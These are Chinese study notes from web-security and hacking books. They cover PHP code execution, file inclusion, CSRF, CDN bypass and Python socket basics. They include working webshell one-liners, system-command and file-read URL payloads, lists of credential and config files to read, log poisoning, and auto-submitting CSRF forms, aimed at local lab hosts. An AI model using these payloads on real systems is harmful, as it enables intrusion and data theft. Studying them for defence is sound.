##### 示例二：代码执行

PHP代码执行中最常见的就是`eval`函数

```php
<?php eval($_POST['cmd']);?>
```

##### 示例三：动态调用函数

PHP支持动态调用函数，代码如下：

```php
<?php
function A(){
    return "A() 函数";
}

function B(){
    return "B() 函数";
}

$fun = $_REQUEST['fun'];
echo $fun();
```

PHP解析器可以根据`$fun`的值来调用对应的函数，当变量为`A`时，那么`$fun()`对应的函数为`A()`，如果输入如下URL：`http://localhost:63342/index.php/test.php?fun=phpinfo`，那么就会执行`phpinfo()`

如果程序员还想给函数传递参数，代码可能如下：

```php
<?php
$fun = $_GET['fun'];
$par = $_GET['par'];

$fun($par);
```

当用户提交URL为`http://localhost:63342/index.php/test.php?fun=system&par=net%20user`，最终执行函数为：`system('net user')`

##### 示例四：PHP 函数代码执行漏洞

在PHP中，代码执行漏洞出现较多，像`preg_replace() ob_start() array_map()`等函数都存在代码执行的问题

```php
<?php
$arr = $_GET['arr'];
$array = array(1, 2, 3, 4, 5);
$new_array = array_map($arr, $array);
```

`array_map()`函数的作用是返回用户自定义函数处理后的数组，payload：`http://localhost:63342/index.php/test.php?arr=phpinfo`

```
array_map
(PHP 4 >= 4.0.6, PHP 5, PHP 7)

array_map — 为数组的每个元素应用回调函数

说明
array_map ( callable $callback , array $array1 [, array $... ] ) : array
array_map()：返回数组，是为 array1 每个元素应用 callback函数之后的数组。 callback 函数形参的数量和传给 array_map() 数组数量，两者必须一样。

参数
callback
回调函数，应用到每个数组里的每个元素。

array1
数组，遍历运行 callback 函数。
```

## 第九章 文件包含漏洞

### 9.1 包含漏洞原理解析

大多数web语言都可以使用文件包含操作，其中PHP语言所提供的文件包含功能太强大，太灵活，所以包含漏洞经常出现在PHP中

### 9.1.1 PHP 包含

PHP 提供了4个文件包含参数

+ `requre()`：找不到被包含的文件时会产生致命错误（E_COMPILE_ERROR），并停止脚本
+ `include()`：找不到被包含的文件时只会产生警告（E_WARNING），脚本将继续执行
+ `include_once()`：此语句和`include()`语句类似，唯一区别时如果该文件中的代码已经被包含，则不会再次包含
+ `requre_once()`：此语句和`require()`语句类似，唯一区别时如果该文件中的代码已经被包含，则不会再次包含

#### 1. 文件包含示例

##### （1）本地文件包含

```
test.xxx 文件内容如下：
<?php phpinfo();?>
```

本地文件包含：

```php
<?php
include 'test.rar';
```

将`test.rar`文件的扩展名改为：`jpg txt xxx doc`进行测试，发现都可以正确显示phpinfo信息。由此可知，**只要文件内容符合PHP语法规范，那么任何扩展名都可以被PHP解析**

![image-20240415170406865](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415170406865.png)

接下来修改`test.xxx`文件内容如下：

```
 phpinfo();
```

执行结果：

![image-20240415170625802](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415170625802.png)

**由此可知，包含非PHP语法规范文件时，将会暴露其源代码**

##### （2）远程文件包含

PHP不仅可以对本地文件进行包含，还可以对远程文件进行包含。如果要使用远程包含功能，首先需要确定PHP是否开启远程包含功能选项（PHP默认关闭远程包含功能）。开启远程包含功能需要在`php.ini`配置文件中修改，膝盖后需要重启Web容器服务使其生效，选项如下：

```
allow_url_include=On			// On 表示允许远程文件包含
```

下面时PHP远程包含的例子：

```php
<?php
include $_GET['page'];
```

访问URL：`http://127.0.0.1/test.php?page=http://127.0.0.1/test.txt`

远程文件包含比本地文件包含要危险很多，因为本地文件包含如果在不配合文件上传的功能下只能做到访问本地敏感文件，但是如果时远程文件包含，黑客只要在自己的服务器上搭建一个带有web木马的网页并控制服务器去包含并执行，就可以轻易拿到web shell

#### 2. 文件包含漏洞利用

##### （1）读取敏感文件

访问URL，`http://127.0.0.1/test.php?page=/etc/passwd`，如果目标主机文件存在，并且具有响应的权限，那么就可以读出文件的内容，反之，就会得到一个类似于：`open_basedir restriction in effect`的警告

常见的敏感信息路径如下：

1. Windows 系统

   ```
   C:\boot.ini												// 查看系统版本
   C:\windows\system32\inetsrv\MetaBase.xml				// IIS配置文件
   C:\windows\repair\sam									// 存储Windows系统初次安装的密码
   C:\Program Files\mysql\my.ini							// Mysql 配置
   C:\Program Files\mysql\data\mysql\user.MYD				// Mysql root
   C:\windows\php.ini										// php 配置信息
   C:\windows\my.ini										// Mysql 配置文件
   ```

2. UNIX/Linux 系统

   ```
   /etc/passwd												
   /usr/local/app/apache2/conf/httpd.conf					// apache2 默认配置文件
   /usr/local/app/apache2/conf/extra/httpd-vhosts.conf		// 虚拟网站设置
   /usr/local/aoo/php5/lib/php.ini							// PHP 相关配置
   /etc/httpd/conf/httpd.conf								// apache配置文件
   /etc/my.cnf												// Mysql 配置文件
   ```

##### （2）远程包含 Shell

如果目标主机 `allow_url_fopen` 选项是激活的，就可以尝试远程包含一句话木马，如：`http://127.0.0.1/echo.txt`代码如下：

```php
<?php fputs(fopen('shell.php', 'w'), "<?php eval($_POST[cmd]);?>");?>
```

目标服务器访问`http://127.0.0.1/echo.txt`就会在目录下生成`shell.php`

##### （3）本地包含配合文件上传

很多网站通常会提供文件上传功能，比如：上传头像、文档等。假设已经上传一句话图片木马到服务器，路径为：`/upload/123.jpg`

图片代码如下：

```php
<?php fputs(fopen('shell.php', 'w'), "<?php eval($_POST[cmd]);?>");?>
```

访问URL：`http://127.0.0.1/test.php?page=./upload/123.jpg`就会在当前所在目录下生成`shell.php`

##### （4）使用PHP封装协议

PHP带有很多内置URL风格的封装协议，这类协议与`fopen() copy() file_exists() filesize()`等文件系统函数所提供的功能类似

<center><strong>PHP内置协议</strong></center>

| 名称      | 含义               |
| --------- | ------------------ |
| file://   | 访问本地文件系统   |
| http://   | 访问HTTP(S)网址    |
| ftp://    | 访问FTP URL        |
| php://    | 访问输入/输出流    |
| zlib://   | 压缩流             |
| data://   | 数据（RFC 2397）   |
| ssh2://   | Secure Shell 2     |
| expect:// | 处理交互式的流     |
| glob://   | 查找匹配的文件路径 |

1. 使用封装协议读取PHP文件

   使用PHP内置封装协议可以读取PHP文件

   ```
   http://127.0.0.1/test4.php?page=php://filter/read=convert.base64-encode/resource=C:\Users\19374\Desktop\CTF\passwd
   ```

   访问URL，得到经过Base64编码的字符串

   ![image-20240415174455511](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415174455511.png)

2. 写入PHP文件

   使用`php://input`可以执行PHP语句，但使用这条语句时需要注意：`php://input`受限于`allow_url_include`选项，也就是说，只有在`allow_url_include`为On时才可以使用

##### （5）包含Apace日志文件

在特定的情况下，如果我们掌握了Apache文件的日志路径，那么只要我们想办法在日志文件上写入一句话木马，并配置文件包含漏洞去包含日志文件，就可以执行一句话木马了（上面说到：只要包含的字符符合PHP语法规范就可以被执行）

如访问URL：`http://127.0.0.1/<?php phpinfo()?>`，这个访问信息会被Apache日志文件记录，此时只要包含这个日志文件即可输出phpinfo

**注：**由于浏览器会自动将`< > `做URL编码，所以哪怕Apache记录到日志的话，也是已经被URL编码过一次了，此时就不是正确的PHP语法了，可是我们**可以使用Burp Suite来绕过编码**

##### （6）截断包含

有些CTF题或者程序员的源码如下：

```php
<?php
include $_GET['page'] . '.jpg';
```

此时如果我们想包含`shell.php`那么就会包含`shell.php.jpg`，但是由于`shell.php.jpg`不存在，那么就会报错！

那么当`magic_quotes_gpc=Off`时，就可以使用`%00(NULL)`截断，如：`http://127.0.0.1/test4.php?page=test.txt%00`

`magic_quotes_gpc=On`时，就会对以下字符转义：

+ 单引号
+ 双引号
+ 反斜杠
+ NULL

**附：**PHP7的配置文件中已经没有找到`magic_quotes_gpc`这个配置项了

在PHP的老版本中，也存在下面的截断问题，但是已经很少见了

```
index.php?file=info.txt././././././... 超过一定数量 ./
```

## 第十章 其他漏洞

### 10.1 CSRF

CSRF（Cross-Site Request Forgrty）是指跨站请求伪造，一般是hacker精心构造一条特殊的URL并诱导用户去点击导致在用户未授权的情况下做一些意外操作（修改用户密码、冒充用户转账）

#### 10.1.1 CSRF 攻击原理

当我们打开或登录某个网站后，浏览器与网站所存放的服务器将会产生一个会话，在这个会话还没有结束时，你就可以利用你的权限对网站进行某些操作。但是，如果你在此时点击了黑客构造的URL，就会导致一些你未授权的意外操作

构成CSRF攻击的重点：

+ CSRF 的攻击建立在浏览器与Web服务器的会话中
+ 欺骗用户访问URL

#### 10.1.2 CSRF 攻击 GET

这里不描述攻击场景，只对攻击手法做描述！！！

现在发现了一个CSRF漏洞，但是需要用户在访问一条URL的情况下同时访问两个URL

```html
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
</head>
<body>
<iframe src="http://www.url1.com?uid=123" frameborder="0"></iframe>
<iframe src="http://www.url2.com?pid=456" frameborder="0"></iframe>
</body>
</html>
```

我们只要将这个页面发布出去并诱导用户点击，那么用户只要访问了这个页面就会同时访问`www.url1.com www.url2.com`

#### 10.1.3 CSRF 攻击 POST

很多的CSRF攻击都是基于GET提交的，但是POST提交也可以做到CSRF攻击

用户在访问了这个页面的时候会同时POST访问`http://127.0.0.1/test4.php`

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<form action="http://127.0.0.1/test4.php" method="post" id="myfrom" target="myfrom">
    <input type="hidden" name="listened" value="228820">
</form>
</body>
</html>

<script>
    const myfrom = document.getElementById('myfrom')
    myfrom.submit()
</script>
```

![image-20240415223023008](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415223023008.png)

**如果在某些情况下需要做的是“悄咪咪”地提交数据，不希望页面跳转，那么就可以使用AJAX来解决问题**

#### 10.1.4 浏览器 Cookie 机制

Cookie又两种表现形式，一种是本地Cookie，又称持久性Cookie，另一种则是临时Cookie，又称为Session Cookie。两者区别在于持久型Cookie是服务器端脚本语言向客户端发送Cookie时制定了时效，也就是Expire字段，而且存储与本地，当Expire所制定的时效过期后，Cookie将失效。而Session Cookie则没有指定Expire时效，时存储在浏览器内存中的，当浏览器关闭后，Session Cookie也随之消失

```php
<?php
setcookie('a', 'admin');					// 非持久型 Cookie
setcookie('b', 'bob', time() + 3600);		// 指定了时效，持久型 Cookie
```

![image-20240415223934833](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415223934833.png)

访问同域下的页面时，无论时Session Cookie还是本地Cookie，Cookie将会一起被发送

![image-20240415224026174](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415224026174.png)

继续访问下面网页：

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
</head>
<body>
<form action="http://127.0.0.1/test4.php" method="post" id="myfrom" target="myfrom">
    <input type="hidden" name="listened" value="228820">
</form>
</body>
</html>

<script>
    const myfrom = document.getElementById('myfrom')
    myfrom.submit()
</script>

```

观察请求头发现，在Chrome下会发送Cookie。但不同浏览器的Cookie机制是不一样的，比如IE就不会发送Cookie

![image-20240415224326175](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240415224326175.png)

# Web 安全深度剖析

## 第一章 渗透测试之信息收集

### 1.1.7 绕过目标域名CDN进行信息收集

#### 1. CDN简介及工作流程

CDN（Content Delivery Network，内容分发网络）的目的是通过在现有的网络架构中增加一层新的Cache（缓存）层，将网站的内容发布到最接近用户的网络”边缘“的节点，使用户可以就近取得所需的内容，提高用户访问网络的响应速度，从技术上全名解决网络带宽小、用户访问量大、网点发布不均等原因导致的用户访问网站的响应速度慢的问题

<center>传统、未使用CDN的网站访问过程</center>

![最新绕过目标域名CDN进行信息收集技术-CSDN博客](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/3e127cc9d58c4a4fa0e8122f777d1f9d.png)

具体访问流程如下：

1. 用户输入访问的域名，操作系统向LOCAL DNS查询域名的IP地址
2. LOCAL DNS向ROOT DNS查询域名的授权服务器（这里假设LOCAL DNS缓存过期）
3. ROOT DNS将域名授权的DNS记录回应给LOCAL DNS
4. LOCAL DNS得到域名授权的DNS记录后，继续向域名授权DNS查询目标域名的IP地址
5. 域名授权DNS查询到域名的IP地址后，回应给LOCAL DNS
6. LOCAL DNS将得到的域名IP地址回应给用户端
7. 用户得到域名IP地址后，访问网站服务器
8. 网站服务器应答请求，将内容返回给用户端

<center>使用了CDN的网站访问过程</center>

<img src="%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/images.png" alt="最新绕过目标域名CDN进行信息收集技术- Ms08067安全实验室- 博客园" style="zoom:200%;" />

具体访问流程如下：

1. 用户输入访问的域名，操作系统向LOCAL DNS查询域名的IP地址
2. LOCAL DNS向ROOT DNS查询域名的授权服务器（这里假设LOCAL DNS缓存过期）
3. ROOT DNS将域名授权的DNS记录回应给LOCAL DNS
4. LOCAL DNS得到域名授权的DNS记录后，继续向域名授权DNS查询目标域名的IP地址
5. 域名授权DNS查询到域名记录后（一般是CNAME），回应给LOCAL DNS
6. LOCAL DNS得到域名记录后，向智能调度DNS查询域名的IP地址
7. 智能调度DNS根据一定的算法和策略（如静态拓扑、容量等），将最适合的CDN节点IP地址回应给LOCAL DNS
8. LOCAL DNS将得到的域名IP地址回应给用户端
9. 用户得到域名IP地址后，访问网站服务器
10. CDN节点服务器应答请求，将内容返回给用户端（缓存服务器在本地进行保存，以备以后使用，同时，把获取的数据返回给客户端，完成数据服务过程）

#### 2. 判断目标是否使用了 CDN

##### （1）收到Ping查询

通常，会通过Ping目标主域，观察域名的解析情况，以此判断其是否使用了CDN

![image-20240421001453523](%E4%B9%A6%E7%B1%8D%E7%AC%94%E8%AE%B0.assets/image-20240421001453523.png)

##### （2）在线查询

还可以利用一些在线网站进行全国多地区Ping检测操作，然后对比每个地区Ping出的IP地址结果，查看这些IP地址是否一致，如果都是一样的，则极有可能不存在CDN。如果IP地址大多不太一样或者规律性很强，则可以尝试查询这些IP地址的归属地，判断是否存在CDN

常用多地Ping检测的CDN网站如下：

+ 17CE
+ Myssl
+ 站长工具
+ CDNPlanet

#### 3. 绕过 CDN，寻找真实IP地址

在确认了目标确实使用了CDN后，就需要绕过CDN寻找目标的真实IP地址，下面介绍一些常规方法

1. 内部邮箱源。公司内部的邮件系统通常部署在企业内部，没有经过CDN的解析，通过目标网站用户注册或者RSS订阅功能，查看邮件、寻找右箭头中的邮件服务器域名IP地址，Ping这个邮件服务器的域名，就可以获得目标的真实IP地址
2. 扫描网站的测试文件，如：`phpinfo`
3. 分站域名。因为很多网站主站的访问量比较大，所以主站都是挂CDN的，分站可能没有挂CDN，可以通过Ping二级域名获取分站IP地址，可能会出现分站和主站不是同一个IP地址但在同一个C端下面的情况。从而判断出目标的真实IP地址段
4. 国外访问。国内的CDN往往只针对国内用户的访问速度，而国外的CDN就不一定了，通过国外在线代理网站`App Synthetic Monitor`访问，可能会获得真实IP地址
5. 查询域名的解析记录，如果目标网站之前并没有使用过CDN，则可以通过网站Netcraft查询域名的IP地址历史记录，大致分析出目标的真实IP地址段
6. 如果目标网站有自己的App，则可以尝试利用Fiddler或Burp Suite抓取App的请求，从里面找到目标的真实IP地址
7. 绕过”Cloudflare CDN“查找真实IP地址。现在很多网站都是用Cloadflare提供的CDN服务，在确定了目标网站CDN后，可以先尝试通过网站CloudflareWatch对慕白哦网站进行真实IP地址查询

#### 4. 验证获取的IP地址

找到目标的真实IP地址后，如何验证其真实性？

1. 如果是Web网站，那么最简单的验证方法是直接尝试用IP地址访问，看看响应的页面是不是和访问域名返回的一样
2. 在目标段比较大的情况下，借助类似Masscan、Nmap等端口扫描工具批量扫描对应IP地址段所有开了80、443、8080端口的IP地址，如何逐个尝试IP地址访问，观察响应结果是否未目标网站。如果慕白哦绑定了域名，那么直接访问是访问不到的，这是，需要在Burp Suite中修改header头`host: 192.xxx.xxx.xxx`，或使用其他方法指定Host进行访问

# Python 黑帽子-黑客与渗透测试编程之道

## 1. 基础的网络编程工具

### 1.1 TCP 客户端

```py
import socket

target_host = 'www.httpbin.org'
target_port = 80

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((target_host, target_port))
# 由于本身是TCP协议，且发送的数据是标准的HTTP协议数据，所以会以HTTP协议来打包发送出去
client.send(b'GET /get HTTP/1.1\r\nHost: baidu.com\r\n\r\n')
response = client.recv(4096)
print(response.decode())
client.close()
```

+ `socket.AF_INET`：表示我们将使用标准的IPv4地址或主机名
+ `socket.SOCK_STREAM`：表示这是一个TCP客户端

HTTP GET 请求必须包含以下字段，每个字段以一个回车分割，结尾以两个回车结束：

```
GET /get HTTP/1.1
Host: baidu.com


```

### 1.2 UDP 客户端

```py
import socket

target_host = 'www.httpbin.org'
target_port = 80

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.connect((target_host, target_port))
client.sendto(b'AAABBBCC', (target_host, target_port))
response = client.recvfrom(4096)

client.close()
```

+ `socket.SOCK_DGRAM`：表示这是一个UDP客户端
+ `recvfrom` ：会返回 消息字符串 还有` (IP address, Port)`

### 1.3 TCP 服务器

```py
import socket
import threading

IP = '0.0.0.0'
PORT = 9998


def main():
    # 创建 Server; socket.AF_INET: 使用AF_INET协议簇，形如：(host, port); socket.SOCK_STREAM: TCP协议
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((IP, PORT))
    # 最多允许5个客户端
    server.listen(5)
    print(f"[*] Listening or {IP}:{PORT}")

    while True:
        # 将接受到的客户端socket对象保存到client变量中，将远程链接的详细信息保存到address变量中
        client, address = server.accept()
        # print(address)        ('127.0.0.1', 55627)
        # print(client)         返回 socket 对象
        print(f"[*] Accepted connection from {address[0]}:{address[1]}")
        # 创建线程
        client_handler = threading.Thread(target=handler_client, args=(client,))
        client_handler.start()


def handler_client(client_socket):
    # 使用上下文管理器，由于这里本身传入的就是Socket对象，所以其实就省略了一句 sock.close()
    with client_socket as sock:
        request = sock.recv(1024)
        print(f"[*] Received: {request.decode('utf-8')}")
        sock.send(b'ACK')


if __name__ == '__main__':
    main()

```

